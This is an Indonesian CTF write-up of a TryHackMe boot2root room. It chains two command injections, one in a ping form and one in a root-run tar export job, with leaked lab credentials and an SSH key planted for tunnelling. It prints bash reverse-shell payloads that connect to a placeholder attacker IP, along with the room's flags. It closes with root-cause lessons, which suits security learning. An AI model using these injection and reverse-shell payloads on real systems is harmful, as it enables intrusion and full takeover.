# TryHackMe — Hacker Holidays Day 11: Infinity Pool

| | |
|---|---|
| **Kategori** | Web / Boot2Root |
| **Kesulitan** | Medium |
| **Poin** | 90 |
| **Target** | `http://<TARGET_IP>` (Byte Lotus Hotel — situs hotel "surveillance-luxe") |

## Ringkasan

Room ini adalah boot2root dua flag (user + root). Brief-nya terlihat ada clue soal pivoting:

> "No visible edge. You trace the network to the horizon and find three systems nobody told you about on the other side."

Alur lengkapnya seperti ini: command injection di aplikasi web publik → dapat foothold → nemu tiga service internal yang cuma bisa diakses dari loopback → kredensial bocor berantai dari satu service ke service lain → login ke FreePBX UCP → nemu automation key yang disembunyikan di widget Voicemail → command injection kedua, kali ini sebagai root.

---

## Tahap 1 — Foothold (User Flag)

### Recon

```bash
nmap -p- -T4 --min-rate 5000 -Pn <TARGET_IP>
```

Cuma ada dua port terbuka: 22 (SSH) dan 80 (HTTP, jalan di atas Gunicorn).

Cek `robots.txt`, dan ternyata membocorkan dua path yang seharusnya disembunyikan:

```
Disallow: /internal/
Disallow: /status
```

Halaman `/status` menampilkan sebuah tool bernama "Sister-property connectivity" — semacam form staff untuk cek konektivitas ke properti hotel lain. Form ini POST ke `/internal/netcheck` dengan satu field: `host`.

### Command Injection

Setelah dapat shell, source code `app.py` mengonfirmasi dugaan awal:

```python
proc = subprocess.run(
    f"ping -c 1 {host}",
    shell=True,
    capture_output=True,
    text=True,
    timeout=15,
)
```

Input `host` langsung disisipkan raw ke `shell=True` tanpa sanitasi sama sekali — command injection klasik.

```bash
curl -s -X POST http://<TARGET_IP>/internal/netcheck \
  --data-urlencode "host=127.0.0.1; id"
```

Output-nya `uid=1001(web) gid=1001(web) groups=1001(web)`, jadi RCE-nya sudah terkonfirmasi.

### Reverse Shell

```bash
curl -s -X POST http://<TARGET_IP>/internal/netcheck \
  --data-urlencode "host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
```

Listener di sisi attacker:

```bash
nc -lvnp 4444
```

### User Flag

```bash
find / -name user.txt 2>/dev/null
cat /home/web/user.txt
```

```
THM{n0_v1s1bl3_3dg3}
```

---

## Tahap 2 — Enumerasi "Three Systems"

Dari `ps aux` kelihatan struktur sebenarnya dari mesin ini: ada tiga sub-aplikasi terpisah di bawah `/var/www/infinity_pool/`, masing-masing jalan dengan user dan port sendiri.

| App | User | Bind | Keterangan |
|---|---|---|---|
| edge | web | `0.0.0.0:80` | App publik, sudah dikuasai |
| watchtower | svc-watch | `127.0.0.1:3000` | Ops console, katanya "authenticated by network position" |
| automation | root | `127.0.0.1:9000` | Job runner — ini target akhir buat privesc |

Selain tiga app itu, ada juga FreePBX/Asterisk PBX (`127.0.0.1:8080/ucp`, AMI di `5038`) dan MariaDB (`127.0.0.1:3306`) — semuanya cuma bind ke loopback dan sama sekali nggak terekspos keluar.

### Kredensial Bocor Lewat Watchtower

```bash
curl -s http://127.0.0.1:3000/api/config
```

```json
{
  "automation_endpoint": "http://127.0.0.1:9000",
  "ops_note": "UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "telephony_user": "FreePBXUCPTemplateCreator"
}
```

### Endpoint Automation (Root) — Cuma Bocorin Dokumentasi Lewat `/health`

```bash
curl -s http://127.0.0.1:9000/health
```

```json
{
  "endpoints": {
    "GET /health": "service status",
    "POST /jobs/export": {
      "auth": "Authorization: Bearer <automation key>",
      "body": {"report": "<report name>"},
      "desc": "archive the latest data export"
    }
  },
  "runs_as": "root",
  "service": "automation"
}
```

Endpoint sensitifnya, `/jobs/export`, butuh automation key yang belum diketahui.

---

## Tahap 3 — Masalah Login UCP Lewat curl (dan Solusinya)

### Yang Salah

Sudah dicoba berkali-kali login ke FreePBX UCP lewat curl maupun Python requests: ambil CSRF token dari halaman GET, lalu POST token + kredensial ke `?display=dashboard`. Hasilnya selalu gagal — balik lagi ke halaman login dengan token baru, padahal cookie session-nya sudah konsisten.

Ternyata penyebabnya: form login UCP FreePBX (`#frm-login`) nggak pakai `action`/`type="submit"` biasa. Tombolnya `type="button"`, dan seluruh proses login ditangani lewat JavaScript AJAX di dalam bundle JS yang sudah di-compile (bukan file sederhana semacam `login.js`). Curl dan requests nggak menjalankan JavaScript, jadi request POST manual nggak pernah bisa mereplikasi payload/format yang sebenarnya dikirim dari sisi client. Beberapa writeup komunitas lain untuk room yang sama juga mengonfirmasi hal serupa: login harus lewat browser asli.

### Solusi: SSH Local Port Forwarding + Browser Asli

Karena UCP (8080), Watchtower (3000), dan automation (9000) semuanya loopback-only di server target, akses dari mesin attacker butuh tunneling. Berhubung user `web` sudah dikuasai penuh, tinggal tambahkan public key sendiri ke `authorized_keys`:

```bash
# di dalam reverse shell
mkdir -p ~/.ssh
echo "ssh-ed25519 AAAA...<public key attacker>..." >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

Lalu di mesin attacker, buka jendela terpisah:

```bash
ssh -i ~/.ssh/id_ed25519 \
  -L 8080:127.0.0.1:8080 \
  -L 3000:127.0.0.1:3000 \
  -L 9000:127.0.0.1:9000 \
  web@<TARGET_IP>
```

Setelah tunnel aktif, buka browser (matikan dulu proxy semacam Burp — proxy transparan bikin error *"First line of request did not contain an absolute URL"* karena request ke localhost malah dikirim ke Burp, bukan langsung ke target):

```
http://localhost:8080/ucp/
```

Login pakai kredensial dari Watchtower — kali ini berhasil, karena JavaScript UCP-nya benar-benar jalan di browser.

---

## Tahap 4 — Automation Key Tersembunyi di Widget Voicemail

Setelah masuk ke UCP dashboard: buat dashboard baru → **Add Widget** → tambahkan widget **Voicemail**. Salah satu entri di kotak masuk voicemail menampilkan Caller ID (CID) yang isinya bukan nomor telepon biasa, tapi sebuah key yang disamarkan sebagai pesan suara:

```
CID: "Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```

Extension `<9000>` di CID itu langsung mengarah ke automation service di port 9000 — jadi udah cukup jelas ini kuncinya. (Ini merujuk ke kerentanan info disclosure FreePBX yang di beberapa writeup komunitas disebut sebagai CVE-2026-46376.)

---

## Tahap 5 — Command Injection Kedua → Root

### Uji Normal

```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"test"}'
```

Response-nya membocorkan command mentah yang dijalankan di belakang layar:

```json
{"command":"tar czf /var/automation/exports/test.tgz /var/automation/data 2>&1", ...}
```

Field `report` disisipkan langsung ke command `tar` tanpa sanitasi — pola command injection yang sama persis dengan bug pertama, cuma sekarang dieksekusi oleh service yang jalan sebagai root.

### Payload Injeksi

```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"test; id #"}'
```

Tanda `#` di akhir berguna buat comment-out sisa command asli (`.tgz /var/automation/data 2>&1`) supaya nggak mengganggu eksekusi payload. Hasilnya:

```
uid=0(root) gid=0(root) groups=0(root)
```

### Reverse Shell Sebagai Root

```bash
curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  -d '{"report":"test; bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1\" #"}'
```

Listener:

```bash
nc -lvnp 5555
```

Koneksi masuk sebagai `root@tryhackme-2404`.

### Root Flag

```bash
find / -name root.txt 2>/dev/null
cat /root/root.txt
```

```
THM{tr4c3d_t0_th3_h0r1z0n}
```

---

## Flags

- **User:** `THM{n0_v1s1bl3_3dg3}`
- **Root:** `THM{tr4c3d_t0_th3_h0r1z0n}`

---

## Root Cause & Pelajaran

1. **Command injection ganda dengan pola yang identik.** Baik di `edge` (`ping -c 1 {host}`) maupun di `automation` (`tar czf ... {report}.tgz ...`), input pengguna disisipkan mentah ke subprocess/shell command tanpa sanitasi atau penggunaan argument list (`shell=False` + list argumen). Bug semacam ini sering muncul berulang di codebase yang sama karena polanya kemungkinan diulang oleh developer yang sama.

2. **"Trust by network position" itu kontrol akses yang lemah.** Watchtower secara eksplisit bilang "authenticated by network position" — begitu foothold awal berhasil didapat, asumsi "cuma bisa diakses dari localhost = aman" langsung runtuh. Service loopback-only tetap harus punya autentikasi yang sesungguhnya, bukan cuma mengandalkan bind address.

3. **Rantai kredensial bocor.** Tiap layer membocorkan kredensial atau akses ke layer berikutnya: Watchtower → kredensial UCP → automation key tersembunyi di voicemail → command injection sebagai root. Kredensial yang bocor di satu service nyaris nggak pernah sekadar dekorasi — selalu ada gunanya untuk ditelusuri lebih lanjut.

4. **Menyembunyikan secret di tempat "kreatif" (voicemail CID) bukan kontrol keamanan.** Security through obscurity nggak bisa gantiin access control yang benar. Automation key semacam ini seharusnya disimpan di secret manager, bukan diselipkan sebagai teks biasa di field yang bisa dilihat siapa pun yang berhasil login ke UCP.

5. **Login berbasis JavaScript berat menghambat automasi command-line.** Kalau form login mengandalkan AJAX kompleks yang susah direplikasi lewat curl/requests, opsi paling efisien biasanya tunneling (SSH local port forwarding) dan login lewat browser asli — daripada buang waktu reverse-engineer bundle JS yang sudah di-minify.

---

## Tools yang Digunakan

- `nmap` — port scanning
- `curl` — testing command injection, interaksi dengan API automation & watchtower
- `nc` (netcat) — listener untuk reverse shell (dua kali: user dan root)
- `ssh` (`ssh-keygen`, local port forwarding `-L`) — tunneling ke service loopback-only (UCP, Watchtower, automation)
- Browser (Chrome) — login UCP yang butuh JavaScript penuh
- `ps aux`, `ss -tulnp`, membaca source code (`app.py`, systemd `.service` files) — enumerasi struktur internal server
